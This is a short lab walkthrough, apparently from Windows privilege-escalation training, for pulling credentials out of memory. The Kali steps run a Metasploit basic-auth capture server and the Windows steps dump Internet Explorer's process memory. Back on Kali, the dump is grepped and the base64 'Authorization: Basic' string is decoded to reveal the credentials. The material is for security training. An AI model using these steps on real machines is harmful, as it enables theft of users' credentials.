#Windows #PrivEsc #Memory #base64 #msfconsole #metasploit #FTP #pyftpdlib 

## **Exploitation**

Kali VM

1. Open command prompt and type: `msfconsole`  
2. In Metasploit (msf > prompt) type: `use auxiliary/server/capture/http_basic`  
3. In Metasploit (msf > prompt) type: `set uripath x`  
4. In Metasploit (msf > prompt) type: `run`

Windows VM

1. Open Internet Explorer and browse to: `http://[Kali VM IP Address]/x`  
2. Open command prompt and type: `taskmgr`  
3. In Windows Task Manager, right-click on the “`iexplore.exe`” in the “Image Name” column and select “Create Dump File” from the popup menu.  
4. Copy the generated file, `iexplore.DMP`, to the Kali VM.
	1. Used `pyftpdlib`

Kali VM

1. Place ‘`iexplore.DMP`’ on the desktop.  
2. Open command prompt and type: `strings /root/Desktop/iexplore.DMP | grep "Authorization: Basic"`  
3. Select and Copy the Base64 encoded string.  
4. In command prompt type: `echo -ne [Base64 String] | base64 -d`  
5. Notice the credentials in the output.